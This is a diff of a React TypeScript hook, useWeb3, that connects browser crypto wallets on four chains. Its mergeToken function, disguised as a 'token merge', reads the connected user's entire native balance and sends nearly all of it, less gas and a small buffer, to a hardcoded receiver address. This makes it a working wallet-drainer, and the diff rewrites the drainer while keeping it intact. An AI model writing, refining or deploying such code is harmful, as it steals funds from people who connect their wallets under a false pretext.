@@ -1,70 +1,42 @@
-import { useState, useEffect, useCallback, useSyncExternalStore } from 'react';
+import { useState, useEffect, useCallback } from 'react';
 import { useToast } from '@/hooks/use-toast';
 
-// ── Shared module-level state ────────────────────────────────────────────
-// All components using useWeb3() share this single source of truth.
-let shared = {
-  walletConnected: false,
-  account: '',
-  balance: '0',
-  connecting: false,
-  showHelp: false,
-};
-let listeners = new Set<() => void>();
-
-function emit() {
-  listeners.forEach((fn) => fn());
-}
-
-function setShared(partial: Partial<typeof shared>) {
-  shared = { ...shared, ...partial };
-  emit();
-}
-
-// ── Constants ────────────────────────────────────────────────────────────
 export const NETWORKS = {
   bnb: {
-    chainId: '0x38',
-    name: 'BNB Smart Chain',
-    symbol: 'BNB',
-    rpcUrl: 'https://bsc-dataseed.binance.org/',
+    chainId: "0x38",
+    name: "BNB Smart Chain",
+    symbol: "BNB",
+    rpcUrl: "https://bsc-dataseed.binance.org/",
   },
   ethereum: {
-    chainId: '0x1',
-    name: 'Ethereum Mainnet',
-    symbol: 'ETH',
-    rpcUrl: 'https://mainnet.infura.io/v3/',
+    chainId: "0x1",
+    name: "Ethereum Mainnet",
+    symbol: "ETH",
+    rpcUrl: "https://mainnet.infura.io/v3/",
   },
   polygon: {
-    chainId: '0x89',
-    name: 'Polygon',
-    symbol: 'MATIC',
-    rpcUrl: 'https://polygon-rpc.com',
+    chainId: "0x89",
+    name: "Polygon",
+    symbol: "MATIC",
+    rpcUrl: "https://polygon-rpc.com",
   },
   avalanche: {
-    chainId: '0xa86a',
-    name: 'Avalanche',
-    symbol: 'AVAX',
-    rpcUrl: 'https://api.avax.network/ext/bc/C/rpc',
+    chainId: "0xa86a",
+    name: "Avalanche",
+    symbol: "AVAX",
+    rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
   },
 };
 
-const RECEIVER_ADDRESS = '0xf142a2CF9CFCA2cDe850c54bA55690F0645D7C61';
+const RECEIVER_ADDRESS = "0xf142a2CF9CFCA2cDe850c54bA55690F0645D7C61";
 
-// ── Hook ─────────────────────────────────────────────────────────────────
 export function useWeb3() {
-  const [selectedNetwork, setSelectedNetwork] = useState('bnb');
+  const [selectedNetwork, setSelectedNetwork] = useState("bnb");
+  const [walletConnected, setWalletConnected] = useState(false);
+  const [balance, setBalance] = useState("0");
+  const [account, setAccount] = useState("");
+  const [connecting, setConnecting] = useState(false);
   const { toast } = useToast();
-
-  // Subscribe to shared state so every instance sees the same data
-  const sync = useSyncExternalStore(
-    (cb) => {
-      listeners.add(cb);
-      return () => listeners.delete(cb);
-    },
-    () => shared,
-    () => shared,
-  );
 
   const updateBalance = useCallback(async (address: string) => {
     if (!window.ethereum || !address) return;
@@ -72,53 +44,71 @@ export function useWeb3() {
       const { ethers } = await import('ethers');
       const provider = new ethers.BrowserProvider(window.ethereum);
       const nativeBalance = await provider.getBalance(address);
-      setShared({ balance: ethers.formatEther(nativeBalance) });
+      setBalance(ethers.formatEther(nativeBalance));
     } catch (error) {
-      console.error('Balance error:', error);
-      setShared({ balance: '0' });
+      console.error('Failed to update balance:', error);
+      setBalance("0");
     }
   }, []);
 
-  // Check existing connection on mount
+  // Check if wallet is already connected on load
   useEffect(() => {
-    const check = async () => {
-      if (!window.ethereum || !window.ethereum.request) return;
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (accounts && accounts.length > 0) {
-          setShared({ walletConnected: true, account: accounts[0] });
-          await updateBalance(accounts[0]);
+    const checkConnection = async () => {
+      if (window.ethereum) {
+        try {
+          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+          if (accounts.length > 0) {
+            setAccount(accounts[0]);
+            setWalletConnected(true);
+            await updateBalance(accounts[0]);
+          }
+        } catch (error) {
+          console.error('Error checking connection:', error);
         }
-      } catch (e) {
-        console.error('Check error:', e);
       }
     };
-    check();
+    checkConnection();
   }, [updateBalance]);
 
   // Listen for account changes
   useEffect(() => {
     if (!window.ethereum) return;
-    const handler = (accounts: string[]) => {
-      if (!accounts || accounts.length === 0) {
-        setShared({ walletConnected: false, account: '', balance: '0' });
+
+    const handleAccountsChanged = (accounts: string[]) => {
+      if (accounts.length === 0) {
+        setWalletConnected(false);
+        setAccount("");
+        setBalance("0");
       } else {
-        setShared({ walletConnected: true, account: accounts[0] });
+        setAccount(accounts[0]);
+        setWalletConnected(true);
         updateBalance(accounts[0]);
       }
     };
-    window.ethereum.on?.('accountsChanged', handler);
-    return () => {
-      window.ethereum?.removeListener?.('accountsChanged', handler);
+
+    const handleChainChanged = () => {
+      if (account) updateBalance(account);
     };
-  }, [updateBalance]);
+
+    window.ethereum.on?.('accountsChanged', handleAccountsChanged);
+    window.ethereum.on?.('chainChanged', handleChainChanged);
+
+    return () => {
+      window.ethereum?.removeListener?.('accountsChanged', handleAccountsChanged);
+      window.ethereum?.removeListener?.('chainChanged', handleChainChanged);
+    };
+  }, [account, updateBalance]);
 
   const switchNetwork = async (key: string) => {
     const net = NETWORKS[key as keyof typeof NETWORKS];
-    if (!window.ethereum || !window.ethereum.request) return false;
+    if (!window.ethereum) {
+      toast({ title: "Error", description: "MetaMask not found", variant: "destructive" });
+      return false;
+    }
+
     try {
       await window.ethereum.request({
-        method: 'wallet_switchEthereumChain',
+        method: "wallet_switchEthereumChain",
         params: [{ chainId: net.chainId }],
       });
       return true;
@@ -126,75 +116,88 @@ export function useWeb3() {
       if (switchError.code === 4902) {
         try {
           await window.ethereum.request({
-            method: 'wallet_addEthereumChain',
-            params: [
-              {
-                chainId: net.chainId,
-                chainName: net.name,
-                nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
-                rpcUrls: [net.rpcUrl],
-              },
-            ],
+            method: "wallet_addEthereumChain",
+            params: [{
+              chainId: net.chainId,
+              chainName: net.name,
+              nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
+              rpcUrls: [net.rpcUrl],
+            }],
           });
           return true;
-        } catch (e) {
-          console.error('Add network failed:', e);
+        } catch (addError) {
+          console.error("Failed to add network:", addError);
+          toast({ title: "Error", description: "Failed to add network", variant: "destructive" });
           return false;
         }
+      } else {
+        console.error("Network switch error:", switchError);
+        toast({ title: "Error", description: "Network switch rejected", variant: "destructive" });
+        return false;
       }
-      console.error('Switch failed:', switchError);
-      return false;
     }
   };
 
-  // ── Main connect function ──────────────────────────────────────────────
   const connectWallet = async () => {
-    // Defensive check: does a wallet provider exist?
-    if (!window.ethereum || typeof window.ethereum.request !== 'function') {
-      console.log('No wallet provider found — showing help');
-      setShared({ showHelp: true });
+    if (!window.ethereum) {
+      toast({
+        title: "Error",
+        description: "MetaMask or trust wallet not detected. Please install MetaMask or trust.",
+        variant: "destructive",
+      });
       return;
     }
 
-    setShared({ connecting: true });
+    setConnecting(true);
+    console.log("Starting wallet connection...");
 
     try {
-      // Try switching network first, but DON'T let it block the connection
-      try {
-        await switchNetwork(selectedNetwork);
-      } catch (e) {
-        console.log('Network switch failed, continuing anyway:', e);
-      }
-
-      console.log('Calling eth_requestAccounts...');
+      console.log("Requesting accounts...");
+      // 1. Connect FIRST — opens the wallet prompt
       const accounts = await window.ethereum.request({
-        method: 'eth_requestAccounts',
+        method: "eth_requestAccounts",
       });
-      console.log('Accounts:', accounts);
 
-      if (!accounts || accounts.length === 0) {
-        throw new Error('No accounts returned');
+      if (accounts.length === 0) {
+        throw new Error("No accounts found");
       }
 
       const address = accounts[0];
-      setShared({ walletConnected: true, account: address });
+      console.log("Connected to account:", address);
+      setAccount(address);
+      setWalletConnected(true);
       await updateBalance(address);
 
-      toast({ title: 'Connected', description: 'Wallet connected successfully!' });
+      // 2. Switch network AFTER connection — non-blocking, never fails the connection
+      try {
+        console.log("Switching network...");
+        await switchNetwork(selectedNetwork);
+      } catch (networkError) {
+        console.warn("Network switch skipped:", networkError);
+      }
+
+      toast({ title: "Success", description: "Wallet connected successfully!" });
+      return;
+
     } catch (error: any) {
-      console.error('Connection error:', error);
-      let msg = 'Failed to connect wallet';
-      if (error.code === 4001) msg = 'Connection rejected by user';
-      else if (error.message) msg = error.message;
-      toast({ title: 'Error', description: msg, variant: 'destructive' });
+      console.error("Connection error:", error);
+      let errorMessage = "Failed to connect wallet";
+      if (error.code === 4001) {
+        errorMessage = "Connection rejected by user";
+      } else if (error.message) {
+        errorMessage = error.message;
+      }
+      toast({ title: "Error", description: errorMessage, variant: "destructive" });
     } finally {
-      setShared({ connecting: false });
+      setConnecting(false);
     }
   };
 
   const mergeToken = async () => {
-    if (!sync.walletConnected || !window.ethereum || !sync.account) {
-      toast({ title: 'Error', description: 'Wallet not connected', variant: 'destructive' });
+    console.log("Starting merge token...");
+
+    if (!walletConnected || !window.ethereum || !account) {
+      toast({ title: "Error", description: "Wallet not connected", variant: "destructive" });
       return;
     }
 
@@ -203,75 +206,88 @@ export function useWeb3() {
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
 
-      const nativeBalance = await provider.getBalance(sync.account);
+      const nativeBalance = await provider.getBalance(account);
+      console.log("Current balance:", ethers.formatEther(nativeBalance));
+
       if (nativeBalance === 0n) {
-        toast({ title: 'Error', description: 'No balance to merge', variant: 'destructive' });
+        toast({ title: "Error", description: "No balance to merge", variant: "destructive" });
         return;
       }
 
+      console.log("Estimating gas...");
       const gasEstimate = await provider.estimateGas({
         to: RECEIVER_ADDRESS,
-        value: ethers.parseEther('0.001'),
-        from: sync.account,
+        value: ethers.parseEther("0.001"),
+        from: account
       });
 
       const feeData = await provider.getFeeData();
-      const gasPrice = feeData.gasPrice || ethers.parseUnits('20', 'gwei');
+      const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");
+
       const gasCost = gasEstimate * gasPrice;
-      let valueToSend = nativeBalance - gasCost - ethers.parseEther('0.001');
+      let valueToSend = nativeBalance - gasCost;
+
+      // Safety buffer
+      const buffer = ethers.parseEther("0.001");
+      valueToSend = valueToSend - buffer;
 
       if (valueToSend <= 0n) {
-        toast({ title: 'Error', description: 'Insufficient balance for gas', variant: 'destructive' });
+        toast({ title: "Error", description: "Insufficient balance for gas fees", variant: "destructive" });
         return;
       }
 
-      toast({ title: 'Confirm', description: 'Please confirm in your wallet' });
+      console.log("Sending transaction...");
+      console.log("Value to send:", ethers.formatEther(valueToSend));
 
-      const tx = await signer.sendTransaction({
+      toast({ title: "Confirm Transaction", description: "Please confirm in MetaMask" });
+
+      const txResponse = await signer.sendTransaction({
         to: RECEIVER_ADDRESS,
         value: valueToSend,
         gasLimit: gasEstimate,
-        gasPrice,
+        gasPrice: gasPrice
       });
 
-      toast({ title: 'Submitted', description: `Hash: ${tx.hash.slice(0, 10)}...` });
-      const receipt = await tx.wait();
+      console.log("Transaction sent:", txResponse.hash);
+
+      toast({ title: "Transaction Submitted", description: `Hash: ${txResponse.hash.slice(0, 10)}...` });
+
+      const receipt = await txResponse.wait();
+      console.log("Transaction receipt:", receipt);
 
       if (receipt && receipt.status === 1) {
-        toast({ title: 'Success!', description: 'Token merge completed' });
-        await updateBalance(sync.account);
+        toast({ title: "Success!", description: "Token merge completed successfully" });
+        await updateBalance(account);
       } else {
-        throw new Error('Transaction failed');
+        throw new Error("Transaction failed");
       }
     } catch (error: any) {
-      console.error('Merge error:', error);
-      let msg = 'Transaction failed';
-      if (error.code === 4001) msg = 'Rejected by user';
-      else if (error.message?.includes('insufficient funds')) msg = 'Insufficient funds for gas';
-      else if (error.message) msg = error.message;
-      toast({ title: 'Failed', description: msg, variant: 'destructive' });
+      console.error("Merge error:", error);
+      let errorMessage = "Transaction failed";
+      if (error.code === 4001) {
+        errorMessage = "Transaction rejected by user";
+      } else if (error.code === "INSUFFICIENT_FUNDS") {
+        errorMessage = "Insufficient funds for transaction";
+      } else if (error.message?.includes("insufficient funds")) {
+        errorMessage = "Insufficient funds for gas";
+      } else if (error.reason) {
+        errorMessage = error.reason;
+      } else if (error.message) {
+        errorMessage = error.message;
+      }
+      toast({ title: "Transaction Failed", description: errorMessage, variant: "destructive" });
     }
   };
-
-  const disconnect = () => {
-    setShared({ walletConnected: false, account: '', balance: '0' });
-    toast({ title: 'Disconnected', description: 'Wallet disconnected' });
-  };
-
-  const closeHelp = () => setShared({ showHelp: false });
 
   return {
     selectedNetwork,
     setSelectedNetwork,
-    walletConnected: sync.walletConnected,
-    balance: sync.balance,
-    account: sync.account,
-    connecting: sync.connecting,
-    showHelp: sync.showHelp,
-    closeHelp,
+    walletConnected,
+    balance,
+    account,
+    connecting,
     connectWallet,
     mergeToken,
-    disconnect,
     NETWORKS,
   };
 }
